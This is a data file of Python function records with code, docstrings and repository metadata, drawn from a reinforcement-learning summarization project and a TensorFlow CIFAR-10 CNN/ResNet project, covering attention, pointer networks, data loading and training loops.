{"docstring": "\"\"\"atten_mem: Tensor of size [num_sents, input_dim]\"\"\"\n", "func_signal": "def forward(self, attn_mem, n_ext=None):\n", "code": "if n_ext is not None:\n    return super().forward(attn_mem, n_ext)\nmax_step = attn_mem.size(0)\nattn_mem = torch.cat([attn_mem, self._stop.unsqueeze(0)], dim=0)\nattn_feat = torch.mm(attn_mem, self._attn_wm)\nhop_feat = torch.mm(attn_mem, self._hop_wm)\noutputs = []\ndists = []\nlstm_in = self._init_i.unsqueeze(0)\nlstm_states = (self._init_h.unsqueeze(1), self._init_c.unsqueeze(1))\nwhile True:\n    h, c = self._lstm_cell(lstm_in, lstm_states)\n    query = h[:, -1, :]\n    for _ in range(self._n_hop):\n        query = PtrExtractorRL.attention(hop_feat, query,\n                                        self._hop_v, self._hop_wq)\n    score = PtrExtractorRL.attention_score(\n        attn_feat, query, self._attn_v, self._attn_wq)\n    for o in outputs:\n        score[0, o.item()] = -1e18\n    if self.training:\n        prob = F.softmax(score, dim=-1)\n        m = torch.distributions.Categorical(prob)\n        dists.append(m)\n        out = m.sample()\n    else:\n        out = score.max(dim=1, keepdim=True)[1]\n    outputs.append(out)\n    if out.item() == max_step:\n        break\n    lstm_in = attn_mem[out.item()].unsqueeze(0)\n    lstm_states = (h, c)\nif dists:\n    # return distributions only when not empty (trining)\n    return outputs, dists\nelse:\n    return outputs", "path": "model\\rl.py", "repo_name": "ChenRocks/fast_abs_rl", "stars": 618, "license": "mit", "language": "python", "size": 82}
{"docstring": "\"\"\"atten_mem: Tensor of size [num_sents, input_dim]\"\"\"\n", "func_signal": "def forward(self, attn_mem, n_step):\n", "code": "attn_feat = torch.mm(attn_mem, self._attn_wm)\nhop_feat = torch.mm(attn_mem, self._hop_wm)\noutputs = []\nlstm_in = self._init_i.unsqueeze(0)\nlstm_states = (self._init_h.unsqueeze(1), self._init_c.unsqueeze(1))\nfor _ in range(n_step):\n    h, c = self._lstm_cell(lstm_in, lstm_states)\n    query = h[:, -1, :]\n    for _ in range(self._n_hop):\n        query = PtrExtractorRL.attention(hop_feat, query,\n                                        self._hop_v, self._hop_wq)\n    score = PtrExtractorRL.attention_score(\n        attn_feat, query, self._attn_v, self._attn_wq)\n    if self.training:\n        prob = F.softmax(score, dim=-1)\n        out = torch.distributions.Categorical(prob)\n    else:\n        for o in outputs:\n            score[0, o[0, 0].item()][0] = -1e18\n        out = score.max(dim=1, keepdim=True)[1]\n    outputs.append(out)\n    lstm_in = attn_mem[out[0, 0].item()].unsqueeze(0)\n    lstm_states = (h, c)\nreturn outputs", "path": "model\\rl.py", "repo_name": "ChenRocks/fast_abs_rl", "stars": 618, "license": "mit", "language": "python", "size": 82}
{"docstring": "\"\"\" attention context vector\"\"\"\n", "func_signal": "def attention(attention, attention_feat, query, v, w):\n", "code": "sum_ = attention_feat + torch.mm(query, w)\nscore = F.softmax(torch.mm(F.tanh(sum_), v.unsqueeze(1)).t(), dim=-1)\noutput = torch.mm(score, attention)\nreturn output", "path": "model\\rl.py", "repo_name": "ChenRocks/fast_abs_rl", "stars": 618, "license": "mit", "language": "python", "size": 82}
{"docstring": "\"\"\"atten_mem: Tensor of size [num_sents, input_dim]\"\"\"\n", "func_signal": "def forward(self, attn_mem, n_step):\n", "code": "attn_feat = torch.mm(attn_mem, self._attn_wm)\nhop_feat = torch.mm(attn_mem, self._hop_wm)\nscores = []\nlstm_in = self._init_i.unsqueeze(0)\nlstm_states = (self._init_h.unsqueeze(1), self._init_c.unsqueeze(1))\nfor _ in range(n_step):\n    h, c = self._lstm_cell(lstm_in, lstm_states)\n    query = h[:, -1, :]\n    for _ in range(self._n_hop):\n        query = PtrScorer.attention(hop_feat, hop_feat, query,\n                                    self._hop_v, self._hop_wq)\n    output = PtrScorer.attention(\n        attn_mem, attn_feat, query, self._attn_v, self._attn_wq)\n    score = self._score_linear(output)\n    scores.append(score)\n    lstm_in = output\nreturn scores", "path": "model\\rl.py", "repo_name": "ChenRocks/fast_abs_rl", "stars": 618, "license": "mit", "language": "python", "size": 82}
{"docstring": "\"\"\" unnormalized attention score\"\"\"\n", "func_signal": "def attention_score(attention, query, v, w):\n", "code": "sum_ = attention + torch.mm(query, w)\nscore = torch.mm(F.tanh(sum_), v.unsqueeze(1)).t()\nreturn score", "path": "model\\rl.py", "repo_name": "ChenRocks/fast_abs_rl", "stars": 618, "license": "mit", "language": "python", "size": 82}
{"docstring": "\"\"\" attention context vector\"\"\"\n", "func_signal": "def attention(attention, query, v, w, mem_sizes):\n", "code": "score = LSTMPointerNet.attention_score(attention, query, v, w)\nif mem_sizes is None:\n    norm_score = F.softmax(score, dim=-1)\nelse:\n    mask = len_mask(mem_sizes, score.device).unsqueeze(-2)\n    norm_score = prob_normalize(score, mask)\noutput = torch.matmul(norm_score, attention)\nreturn output", "path": "model\\extract.py", "repo_name": "ChenRocks/fast_abs_rl", "stars": 618, "license": "mit", "language": "python", "size": 82}
{"docstring": "\"\"\" load pretrained sub-modules and build the actor-critic network\"\"\"\n# load pretrained abstractor model\n", "func_signal": "def configure_net(abs_dir, ext_dir, cuda):\n", "code": "if abs_dir is not None:\n    abstractor = Abstractor(abs_dir, MAX_ABS_LEN, cuda)\nelse:\n    abstractor = identity\n\n# load ML trained extractor net and buiild RL agent\nextractor, agent_vocab = load_ext_net(ext_dir)\nagent = ActorCritic(extractor._sent_enc,\n                    extractor._art_enc,\n                    extractor._extractor,\n                    ArticleBatcher(agent_vocab, cuda))\nif cuda:\n    agent = agent.cuda()\n\nnet_args = {}\nnet_args['abstractor'] = (None if abs_dir is None\n                          else json.load(open(join(abs_dir, 'meta.json'))))\nnet_args['extractor'] = json.load(open(join(ext_dir, 'meta.json')))\n\nreturn agent, agent_vocab, abstractor, net_args", "path": "train_full_rl.py", "repo_name": "ChenRocks/fast_abs_rl", "stars": 618, "license": "mit", "language": "python", "size": 82}
{"docstring": "\"\"\" [batch_size, max_num_sent, input_dim] Tensor\"\"\"\n", "func_signal": "def forward(self, input_, in_lens=None):\n", "code": "size = (self._init_h.size(0), input_.size(0), self._init_h.size(1))\ninit_states = (self._init_h.unsqueeze(1).expand(*size),\n               self._init_c.unsqueeze(1).expand(*size))\nlstm_out, _ = lstm_encoder(\n    input_, self._lstm, in_lens, init_states)\nreturn lstm_out.transpose(0, 1)", "path": "model\\extract.py", "repo_name": "ChenRocks/fast_abs_rl", "stars": 618, "license": "mit", "language": "python", "size": 82}
{"docstring": "\"\"\" unnormalized attention score\"\"\"\n", "func_signal": "def attention_score(attention, query, v, w):\n", "code": "sum_ = attention.unsqueeze(1) + torch.matmul(\n    query, w.unsqueeze(0)\n).unsqueeze(2)  # [B, Nq, Ns, D]\nscore = torch.matmul(\n    F.tanh(sum_), v.unsqueeze(0).unsqueeze(1).unsqueeze(3)\n).squeeze(3)  # [B, Nq, Ns]\nreturn score", "path": "model\\extract.py", "repo_name": "ChenRocks/fast_abs_rl", "stars": 618, "license": "mit", "language": "python", "size": 82}
{"docstring": "# input variable\n", "func_signal": "def construct_model(self, batch_size=128):\n", "code": "self.image = tf.placeholder(dtype=tf.float32, shape=[batch_size, 784], name='image')\nself.label = tf.placeholder(dtype=tf.float32, shape=[batch_size, 10], name='label')\nself.keep_prob = tf.placeholder(dtype=tf.float32, name='keep_prob')\nimage_tensor = tf.reshape(tensor=self.image, shape=[batch_size, 28, 28, 1], \n                          name='image_tensor')\n\n# convolutional layer 1\n# filter\nW_conv1 = tf.Variable(\n    initial_value=tf.random_normal(shape=[5, 5, 1, 16], mean=0.0, stddev=0.01), \n    name='W_conv1')\n# bias\nb_conv1 = tf.Variable(\n    initial_value=tf.zeros(shape=[16]), \n    name='b_conv1')\n# hidden states\nh_conv1 = tf.nn.relu(\n    tf.nn.conv2d(input=image_tensor, filter=W_conv1, \n                 strides=[1, 2, 2, 1], padding='SAME') + b_conv1, \n    name='h_conv1')\n\n# convolutional layer 2\n# filter\nW_conv2 = tf.Variable(\n    initial_value=tf.random_normal(shape=[5, 5, 16, 16], mean=0.0, stddev=0.01), \n    name='W_conv2')\n# bias\nb_conv2 = tf.Variable(\n    initial_value=tf.zeros(shape=[16]), \n    name='b_conv2')\n# hidden states\nh_conv2 = tf.nn.relu(\n    tf.nn.conv2d(input=h_conv1, filter=W_conv2, \n                 strides=[1, 2, 2, 1], padding='SAME') + b_conv2, \n    name='h_conv2')\nh_conv2_flat = tf.reshape(tensor=h_conv2, shape=[-1, 7 * 7 * 16], name='h_conv2_flat')\n\n# fully-connected layer\n# weight\nW_fc1 = tf.Variable(\n    initial_value=tf.random_normal(shape=[7 * 7 * 16, 64], mean=0.0, stddev=0.01), \n    name='W_fc1')\n# bias\nb_fc1 = tf.Variable(\n    initial_value=tf.zeros(shape=[64]), \n    name='b_fc1')\n# hidden_states\nh_fc1 = tf.nn.relu(\n    tf.matmul(h_conv2_flat, W_fc1) + b_fc1, \n    name='h_fc1')\nh_fc1_dropout = tf.nn.dropout(h_fc1, keep_prob=self.keep_prob, name='h_fc1_dropout')\n\n# softmax layer\n# weight\nW_softmax = tf.Variable(\n    initial_value=tf.random_normal(shape=[64, 10], mean=0.0, stddev=0.01), \n    name='W_softmax')\n# bias\nb_softmax = tf.Variable(\n    initial_value=tf.zeros(shape=[10]), \n    name='b_softmax')\n# softmax\nself.label_prob = tf.nn.softmax(\n    logits=tf.matmul(h_fc1_dropout, W_softmax) + b_softmax)\n\n# objective function and optimizer\nself.objective = - tf.reduce_sum(self.label * tf.log(self.label_prob + 1e-6))\nself.optimizer = tf.train.AdamOptimizer(learning_rate=0.001).minimize(self.objective)\n# observation\ncorrect_prediction = tf.equal(tf.argmax(self.label_prob, 1), tf.argmax(self.label, 1))\nself.accuracy = tf.reduce_mean(tf.cast(correct_prediction, 'float'))\nself.label_pred = tf.argmax(self.label_prob, 1)\nself.label_max_prob = tf.reduce_max(self.label_prob)\nself.gradient = tf.gradients(self.label_max_prob, self.image)", "path": "src\\trash\\basic_cnn_mnist.py", "repo_name": "persistforever/cifar10-tensorflow", "stars": 533, "license": "None", "language": "python", "size": 3622}
{"docstring": "# read iris_training set and test set\n", "func_signal": "def __init__(self, path):\n", "code": "dataset = pandas.read_csv(path)\nself.flower, self.label = dataset.iloc[:,:-1].values, dataset.iloc[:,-1].values\nself.num_examples = self.flower.shape[0]\nself.index = 0", "path": "src\\trash\\basic_rnn.py", "repo_name": "persistforever/cifar10-tensorflow", "stars": 533, "license": "None", "language": "python", "size": 3622}
{"docstring": "# \u6784\u5efa\u4f1a\u8bdd\n", "func_signal": "def train(self, dataloader, backup_path, n_epoch=5, batch_size=128):\n", "code": "gpu_options = tf.GPUOptions(per_process_gpu_memory_fraction=0.45)\nself.sess = tf.Session(config=tf.ConfigProto(gpu_options=gpu_options))\n# \u6a21\u578b\u4fdd\u5b58\u5668\nself.saver = tf.train.Saver(\n    var_list=tf.global_variables(), write_version=tf.train.SaverDef.V2, \n    max_to_keep=5)\n# \u6a21\u578b\u521d\u59cb\u5316\nself.sess.run(tf.global_variables_initializer())\n# \u6a21\u578b\u8bad\u7ec3\nfor epoch in range(0, n_epoch+1):\n    # \u6570\u636e\u589e\u5f3a\n    train_images = dataloader.data_augmentation(dataloader.train_images, mode='train',\n        flip=True, crop=True, crop_shape=(24,24,3), whiten=True, noise=False)\n    train_labels = dataloader.train_labels\n    valid_images = dataloader.data_augmentation(dataloader.valid_images, mode='test',\n        flip=False, crop=True, crop_shape=(24,24,3), whiten=True, noise=False)\n    valid_labels = dataloader.valid_labels\n    \n    # \u5f00\u59cb\u672c\u8f6e\u7684\u8bad\u7ec3\uff0c\u5e76\u8ba1\u7b97\u76ee\u6807\u51fd\u6570\u503c\n    train_loss = 0.0\n    for i in range(0, dataloader.n_train, batch_size):\n        batch_images = train_images[i: i+batch_size]\n        batch_labels = train_labels[i: i+batch_size]\n        [_, avg_loss, iteration] = self.sess.run(\n            fetches=[self.optimizer, self.avg_loss, self.global_step], \n            feed_dict={self.images: batch_images, \n                       self.labels: batch_labels, \n                       self.keep_prob: 0.5})\n        \n        train_loss += avg_loss * batch_images.shape[0]\n    train_loss = 1.0 * train_loss / dataloader.n_train\n    \n    # \u5728\u8bad\u7ec3\u4e4b\u540e\uff0c\u83b7\u5f97\u672c\u8f6e\u7684\u9a8c\u8bc1\u96c6\u635f\u5931\u503c\u548c\u51c6\u786e\u7387\n    valid_accuracy, valid_loss = 0.0, 0.0\n    for i in range(0, dataloader.n_valid, batch_size):\n        batch_images = valid_images[i: i+batch_size]\n        batch_labels = valid_labels[i: i+batch_size]\n        [avg_accuracy, avg_loss] = self.sess.run(\n            fetches=[self.accuracy, self.avg_loss], \n            feed_dict={self.images: batch_images, \n                       self.labels: batch_labels, \n                       self.keep_prob: 1.0})\n        valid_accuracy += avg_accuracy * batch_images.shape[0]\n        valid_loss += avg_loss * batch_images.shape[0]\n    valid_accuracy = 1.0 * valid_accuracy / dataloader.n_valid\n    valid_loss = 1.0 * valid_loss / dataloader.n_valid\n    \n    print('epoch{%d}, iter[%d], train loss: %.6f, '\n          'valid precision: %.6f, valid loss: %.6f' % (\n        epoch, iteration, train_loss, valid_accuracy, valid_loss))\n    sys.stdout.flush()\n    \n    # \u4fdd\u5b58\u6a21\u578b\n    if epoch <= 1000 and epoch % 100 == 0 or \\\n        epoch <= 10000 and epoch % 1000 == 0:\n        saver_path = self.saver.save(\n            self.sess, os.path.join(backup_path, 'model_%d.ckpt' % (epoch)))\n        \nself.sess.close()", "path": "src\\trash\\plain_cnn.py", "repo_name": "persistforever/cifar10-tensorflow", "stars": 533, "license": "None", "language": "python", "size": 3622}
{"docstring": "# \u8bfb\u53d6\u8bad\u7ec3\u96c6\n", "func_signal": "def load_cifar10(self, directory):\n", "code": "images, labels = [], []\nfor filename in ['%s/data_batch_%d' % (directory, j) for j in range(1, 6)]:\n    with open(filename, 'rb') as fo:\n        if 'Windows' in platform.platform():\n            cifar10 = pickle.load(fo, encoding='bytes')\n        elif 'Linux' in platform.platform():\n            cifar10 = pickle.load(fo)\n    for i in range(len(cifar10[b\"labels\"])):\n        image = numpy.reshape(cifar10[b\"data\"][i], (3, 32, 32))\n        image = numpy.transpose(image, (1, 2, 0))\n        image = image.astype(float)\n        images.append(image)\n    labels += cifar10[b\"labels\"]\nimages = numpy.array(images, dtype='float')\nlabels = numpy.array(labels, dtype='int')\nself.train_images, self.train_labels = images, labels\n\n# \u8bfb\u53d6\u6d4b\u8bd5\u96c6\nimages, labels = [], []\nfor filename in ['%s/test_batch' % (directory)]:\n    with open(filename, 'rb') as fo:\n        if 'Windows' in platform.platform():\n            cifar10 = pickle.load(fo, encoding='bytes')\n        elif 'Linux' in platform.platform():\n            cifar10 = pickle.load(fo)\n    for i in range(len(cifar10[b\"labels\"])):\n        image = numpy.reshape(cifar10[b\"data\"][i], (3, 32, 32))\n        image = numpy.transpose(image, (1, 2, 0))\n        image = image.astype(float)\n        images.append(image)\n    labels += cifar10[b\"labels\"]\nimages = numpy.array(images, dtype='float')\nlabels = numpy.array(labels, dtype='int')\nself.test_images, self.test_labels = images, labels", "path": "src\\data\\cifar10.py", "repo_name": "persistforever/cifar10-tensorflow", "stars": 533, "license": "None", "language": "python", "size": 3622}
{"docstring": "# calculate input_shape and output_shape\n", "func_signal": "def get_output(self, input):\n", "code": "self.output_shape = [self.input_shape[0], self.hidden_dim]\n# hidden states\nintermediate = tf.matmul(input, self.weight)\n\n# batch normalization \u6280\u672f\nif self.batch_normal:\n    mean, variance = tf.nn.moments(intermediate, axes=[0])\n    self.hidden = tf.nn.batch_normalization(\n        intermediate, mean, variance, self.bias, self.gamma, self.epsilon)\nelse:\n    self.hidden = intermediate + self.bias\n    \n# dropout \u6280\u672f\nif self.dropout:\n    self.hidden = tf.nn.dropout(self.hidden, keep_prob=self.keep_prob)\n    \n# activation\nif self.activation == 'relu':\n    self.output = tf.nn.relu(self.hidden)\nelif self.activation == 'tanh':\n    self.output = tf.nn.tanh(self.hidden)\nelif self.activation == 'softmax':\n    self.output = tf.nn.softmax(self.hidden)\nelif self.activation == 'none':\n    self.output = self.hidden\n\nreturn self.output", "path": "src\\layer\\dense_layer.py", "repo_name": "persistforever/cifar10-tensorflow", "stars": 533, "license": "None", "language": "python", "size": 3622}
{"docstring": "# \u6570\u636e\u6d41\n", "func_signal": "def _inference(self, images):\n", "code": "hidden_state = images\nfor layer in self.conv_lists:\n    hidden_state = layer.get_output(input=hidden_state)\n\n# global average pooling\nhidden_state = tf.reduce_mean(hidden_state, axis=[1,2])\n\n# classification\nfor layer in self.dense_lists:\n    hidden_state = layer.get_output(input=hidden_state)\nlogits = hidden_state\n\nreturn logits", "path": "src\\network\\resnet.py", "repo_name": "persistforever/cifar10-tensorflow", "stars": 533, "license": "None", "language": "python", "size": 3622}
{"docstring": "# \u7f51\u7edc\u7ed3\u6784\n", "func_signal": "def _network_structure(self):\n", "code": "print('\\n' + '='*20 + ' network structure ' + '='*20)\nprint('%-30s\\t%-25s\\t%-20s\\t%-20s' % ('Name', 'Filter', 'Input', 'Output')) \n\nself.layers = {}\nself.conv_lists, self.dense_lists = [], []\nfor layer_dict in self.network_option['net']['conv_first']:\n    self.layers[layer_dict['name']] = layer = ConvLayer(\n        x_size=layer_dict['x_size'], \n        y_size=layer_dict['y_size'], \n        x_stride=layer_dict['x_stride'], \n        y_stride=layer_dict['y_stride'], \n        n_filter=layer_dict['n_filter'], \n        activation=layer_dict['activation'], \n        batch_normal=layer_dict['bn'], \n        data_format=self.option['data_format'], \n        input_shape=(self.option['image_size'], self.option['image_size'], self.option['n_channel']),\n        name=layer_dict['name'])\n    self.conv_lists.append(layer)\n\nfor i in range(self.network_option['n_layers']):\n    for layer_dict in self.network_option['net']['conv_layer%d' % (i+1)]:\n        if layer_dict['type'] == 'conv':\n            self.layers[layer_dict['name']] = layer = ConvLayer(\n                x_size=layer_dict['x_size'], \n                y_size=layer_dict['y_size'], \n                x_stride=layer_dict['x_stride'], \n                y_stride=layer_dict['y_stride'], \n                n_filter=layer_dict['n_filter'], \n                activation=layer_dict['activation'], \n                batch_normal=layer_dict['bn'], \n                data_format=self.option['data_format'], \n                prev_layer=layer, \n                name=layer_dict['name'])\n        elif layer_dict['type'] == 'residual':\n            self.layers[layer_dict['name']] = layer = ResidualBlock(\n                x_size=layer_dict['x_size'], \n                y_size=layer_dict['y_size'], \n                x_stride=layer_dict['x_stride'], \n                y_stride=layer_dict['y_stride'], \n                n_filter=layer_dict['n_filter'], \n                activation=layer_dict['activation'], \n                batch_normal=layer_dict['bn'], \n                data_format=self.option['data_format'], \n                prev_layer=layer, \n                name=layer_dict['name'])\n        self.conv_lists.append(layer)\n\nfor layer_dict in self.network_option['net']['dense_first']:\n    self.layers[layer_dict['name']] = layer = DenseLayer(\n        hidden_dim=layer_dict['hidden_dim'], \n        activation=layer_dict['activation'],\n        batch_normal=layer_dict['bn'], \n        input_shape=(64, ),\n        name=layer_dict['name'])\n    self.dense_lists.append(layer)\n\nprint('='*20 + ' network structure ' + '='*20 + '\\n')", "path": "src\\network\\resnet.py", "repo_name": "persistforever/cifar10-tensorflow", "stars": 533, "license": "None", "language": "python", "size": 3622}
{"docstring": "# \u8bbe\u7f6e\u8d85\u53c2\u6570\n", "func_signal": "def __init__(self, n_channel=3, n_classes=10, image_size=24):\n", "code": "self.n_channel = n_channel\nself.n_classes = n_classes\nself.image_size = image_size\n\n# \u8f93\u5165\u53d8\u91cf\nself.images = tf.placeholder(\n    dtype=tf.float32, shape=[None, self.image_size, self.image_size, self.n_channel], \n    name='images')\nself.labels = tf.placeholder(\n    dtype=tf.int64, shape=[None], name='labels')\nself.keep_prob = tf.placeholder(\n    dtype=tf.float32, name='keep_prob')\nself.global_step = tf.Variable(\n    0, dtype=tf.int32, name='global_step')\n\n# \u7f51\u7edc\u8f93\u51fa\nself.logits = self.inference(self.images)\n# \u76ee\u6807\u51fd\u6570\nself.objective = tf.reduce_sum(\n    tf.nn.sparse_softmax_cross_entropy_with_logits(\n        logits=self.logits, labels=self.labels))\ntf.add_to_collection('losses', self.objective)\nself.avg_loss = tf.add_n(tf.get_collection('losses'))\n# \u4f18\u5316\u5668\nlr = tf.cond(tf.less(self.global_step, 50000), \n             lambda: tf.constant(0.01),\n             lambda: tf.cond(tf.less(self.global_step, 100000),\n                             lambda: tf.constant(0.005),\n                             lambda: tf.cond(tf.less(self.global_step, 150000),\n                                             lambda: tf.constant(0.0025),\n                                             lambda: tf.constant(0.001))))\nself.optimizer = tf.train.AdamOptimizer(learning_rate=lr).minimize(\n    self.avg_loss, global_step=self.global_step)\n\n# \u89c2\u5bdf\u503c\ncorrect_prediction = tf.equal(self.labels, tf.argmax(self.logits, 1))\nself.accuracy = tf.reduce_mean(tf.cast(correct_prediction, 'float'))", "path": "src\\trash\\plain_cnn.py", "repo_name": "persistforever/cifar10-tensorflow", "stars": 533, "license": "None", "language": "python", "size": 3622}
{"docstring": "# \u56fe\u50cf\u7ffb\u8f6c\n", "func_signal": "def _image_flip(self, images):\n", "code": "for i in range(images.shape[0]):\n    old_image = images[i,:,:,:]\n    if numpy.random.random() < 0.5:\n        new_image = cv2.flip(old_image, 1)\n    else:\n        new_image = old_image\n    images[i,:,:,:] = new_image\n\nreturn images", "path": "src\\data\\cifar10.py", "repo_name": "persistforever/cifar10-tensorflow", "stars": 533, "license": "None", "language": "python", "size": 3622}
{"docstring": "# \u8bfb\u53d6\u914d\u7f6e\n", "func_signal": "def __init__(self, config_path, network_config_path):\n", "code": "        self.option = yaml.load(open(config_path, 'r'))\n        self.network_option = yaml.load(open(network_config_path, 'r'))\n# \u521d\u59cb\u5316graph\n        self.graph = tf.Graph()\n        with self.graph.as_default():\n            self._network_structure()", "path": "src\\network\\resnet.py", "repo_name": "persistforever/cifar10-tensorflow", "stars": 533, "license": "None", "language": "python", "size": 3622}
{"docstring": "# \u56fe\u50cf\u5207\u5272\n", "func_signal": "def _image_crop_test(self, images, shape):\n", "code": "new_images = []\nfor i in range(images.shape[0]):\n    old_image = images[i,:,:,:]\n    old_image = numpy.pad(old_image, [[4,4], [4,4], [0,0]], 'constant')\n    left = int((old_image.shape[0] - shape[0]) / 2)\n    top = int((old_image.shape[1] - shape[1]) / 2)\n    new_image = old_image[left: left+shape[0], top: top+shape[1], :]\n    new_images.append(new_image)\n\nreturn numpy.array(new_images)", "path": "src\\data\\cifar10.py", "repo_name": "persistforever/cifar10-tensorflow", "stars": 533, "license": "None", "language": "python", "size": 3622}
{"docstring": "# \u8f93\u5165\u53d8\u91cf\n", "func_signal": "def __init__(self, network_path, n_channel=3, n_classes=10, image_size=24):\n", "code": "self.images = tf.placeholder(\n    dtype=tf.float32, shape=[None, image_size, image_size, n_channel], name='images')\nself.labels = tf.placeholder(\n    dtype=tf.int64, shape=[None], name='labels')\nself.keep_prob = tf.placeholder(\n    dtype=tf.float32, name='keep_prob')\nself.global_step = tf.Variable( \n    0, dtype=tf.int32, name='global_step')\n\nnetwork_option_path = os.path.join(network_path)\nself.network_option = yaml.load(open(network_option_path, 'r'))\n# \u7f51\u7edc\u7ed3\u6784\nprint()\nself.conv_lists, self.dense_lists = [], []\nfor layer_dict in self.network_option['net']['conv_first']:\n    layer = ConvLayer(\n        x_size=layer_dict['x_size'], y_size=layer_dict['y_size'], \n        x_stride=layer_dict['x_stride'], y_stride=layer_dict['y_stride'], \n        n_filter=layer_dict['n_filter'], activation=layer_dict['activation'], \n        batch_normal=layer_dict['bn'], weight_decay=1e-4, \n        data_format='channels_last', name=layer_dict['name'], \n        input_shape=(image_size, image_size, n_channel))\n    self.conv_lists.append(layer)\n\nfor layer_dict in self.network_option['net']['conv']:\n    if layer_dict['type'] == 'conv':\n        layer = ConvLayer(\n            x_size=layer_dict['x_size'], y_size=layer_dict['y_size'], \n            x_stride=layer_dict['x_stride'], y_stride=layer_dict['y_stride'], \n            n_filter=layer_dict['n_filter'], activation=layer_dict['activation'], \n            batch_normal=layer_dict['bn'], weight_decay=1e-4, \n            data_format='channels_last', name=layer_dict['name'], prev_layer=layer)\n    elif layer_dict['type'] == 'pool':\n        layer = PoolLayer(\n            x_size=layer_dict['x_size'], y_size=layer_dict['y_size'], \n            x_stride=layer_dict['x_stride'], y_stride=layer_dict['y_stride'], \n            mode=layer_dict['mode'], resp_normal=False, \n            data_format='channels_last', name=layer_dict['name'], prev_layer=layer)\n    self.conv_lists.append(layer)\n\nfor layer_dict in self.network_option['net']['dense_first']:\n    layer = DenseLayer(\n        hidden_dim=layer_dict['hidden_dim'], activation=layer_dict['activation'],\n        dropout=layer_dict['dropout'], keep_prob=self.keep_prob,\n        batch_normal=layer_dict['bn'], weight_decay=1e-4, \n        name=layer_dict['name'],\n        input_shape=(int(image_size/8) * int(image_size/8) * 256, ))\n    self.dense_lists.append(layer)\nfor layer_dict in self.network_option['net']['dense']:\n    layer = DenseLayer(\n        hidden_dim=layer_dict['hidden_dim'], activation=layer_dict['activation'],\n        dropout=layer_dict['dropout'], keep_prob=self.keep_prob,\n        batch_normal=layer_dict['bn'], weight_decay=1e-4, \n        name=layer_dict['name'], prev_layer=layer)\n    self.dense_lists.append(layer)\nprint()\n\n# \u6570\u636e\u6d41\nhidden_state = self.images\nfor layer in self.conv_lists:\n    hidden_state = layer.get_output(inputs=hidden_state)\nhidden_state = tf.reshape(hidden_state, [-1, int(image_size/8) * int(image_size/8) * 256])\nfor layer in self.dense_lists:\n    hidden_state = layer.get_output(inputs=hidden_state)\nlogits = hidden_state\n\n# \u76ee\u6807\u51fd\u6570\nself.objective = tf.reduce_mean(\n    tf.nn.sparse_softmax_cross_entropy_with_logits(\n        logits=logits, labels=self.labels))\nself.avg_loss = self.objective\n\n# \u4f18\u5316\u5668\nlr = tf.cond(tf.less(self.global_step, 50000), \n             lambda: tf.constant(0.001),\n             lambda: tf.cond(tf.less(self.global_step, 100000), \n                             lambda: tf.constant(0.0001),\n                             lambda: tf.constant(0.00001)))\nself.optimizer = tf.train.AdamOptimizer(learning_rate=lr).minimize(\n    self.avg_loss, global_step=self.global_step)\n\n# \u89c2\u5bdf\u503c\ncorrect_prediction = tf.equal(self.labels, tf.argmax(logits, 1))\nself.accuracy = tf.reduce_mean(tf.cast(correct_prediction, 'float'))", "path": "src\\model\\basic_cnn.py", "repo_name": "persistforever/cifar10-tensorflow", "stars": 533, "license": "None", "language": "python", "size": 3622}
{"docstring": "# \u56fe\u50cf\u566a\u58f0\n", "func_signal": "def _image_noise(self, images, mean=0, std=0.01):\n", "code": "for i in range(images.shape[0]):\n    old_image = images[i,:,:,:]\n    new_image = old_image\n    for i in range(image.shape[0]):\n        for j in range(image.shape[1]):\n            for k in range(image.shape[2]):\n                new_image[i, j, k] += random.gauss(mean, std)\n    images[i,:,:,:] = new_image\n\nreturn images", "path": "src\\data\\cifar10.py", "repo_name": "persistforever/cifar10-tensorflow", "stars": 533, "license": "None", "language": "python", "size": 3622}
{"docstring": "# calculate input_shape and output_shape\n", "func_signal": "def get_output(self, input):\n", "code": "self.output_shape = [self.input_shape[0], int(self.input_shape[1]/self.stride),\n                     int(self.input_shape[2]/self.stride), self.n_filter]\n\n# hidden states\nself.conv = tf.nn.conv2d(\n    input=input, filter=self.weight, \n    strides=[1, self.stride, self.stride, 1], padding='SAME')\n\n# batch normalization \u6280\u672f\nif self.batch_normal:\n    mean, variance = tf.nn.moments(self.conv, axes=[0, 1, 2], keep_dims=False)\n    self.hidden = tf.nn.batch_normalization(\n        self.conv, mean, variance, self.bias, self.gamma, self.epsilon)\nelse:\n    self.hidden = self.conv + self.bias\n    \n# activation\nif self.activation == 'relu':\n    self.output = tf.nn.relu(self.hidden)\nelif self.activation == 'tanh':\n    self.output = tf.nn.tanh(self.hidden)\nelif self.activation == 'none':\n    self.output = self.hidden\n\nreturn self.output", "path": "src\\layer\\conv_layer.py", "repo_name": "persistforever/cifar10-tensorflow", "stars": 533, "license": "None", "language": "python", "size": 3622}
{"docstring": "# \u8bfb\u53d6\u914d\u7f6e\n", "func_signal": "def __init__(self, config_path, backups_dir, logs_dir):\n", "code": "self.option = yaml.load(open(config_path, 'r'))\nself.backups_dir = backups_dir\nself.logs_dir = logs_dir", "path": "src\\manager\\resnet.py", "repo_name": "persistforever/cifar10-tensorflow", "stars": 533, "license": "None", "language": "python", "size": 3622}
{"docstring": "# \u6570\u636e\u6d41\n", "func_signal": "def _inference(self, images):\n", "code": "hidden_conv = self.conv_lists[0].get_output(inputs=images)\n\nfor i in range(0, self.network_option['n_blocks']):\n    hidden_conv1 = self.conv_lists[1][2*i].get_output(inputs=hidden_conv)\n    hidden_conv2 = self.conv_lists[1][2*i+1].get_output(inputs=hidden_conv1)\n    hidden_conv = tf.nn.relu(hidden_conv + hidden_conv2)\n\nfor i in range(2, self.network_option['n_layers']+1):\n    hidden_conv1 = self.conv_lists[i][0].get_output(inputs=hidden_conv)\n    hidden_conv2 = self.conv_lists[i][1].get_output(inputs=hidden_conv1)\n    hidden_pool = tf.nn.max_pool(\n        hidden_conv, ksize=[1,2,2,1], strides=[1,2,2,1], padding='SAME')\n    hidden_pad = tf.pad(hidden_pool, [[0,0], [0,0], [0,0], [2**(i+3),2**(i+3)]])\n    hidden_conv = tf.nn.relu(hidden_pad + hidden_conv2)\n    for j in range(1, self.network_option['n_blocks']):\n        hidden_conv1 = self.conv_lists[i][2*j].get_output(inputs=hidden_conv)\n        hidden_conv2 = self.conv_lists[i][2*j+1].get_output(inputs=hidden_conv1)\n        hidden_conv = tf.nn.relu(hidden_conv + hidden_conv2)\n\nhidden_state = tf.reshape(hidden_conv, [-1, int(self.image_size/8) * int(self.image_size/8) * 512])\nfor layer in self.dense_lists:\n    hidden_state = layer.get_output(inputs=hidden_state)\nlogits = hidden_state\n    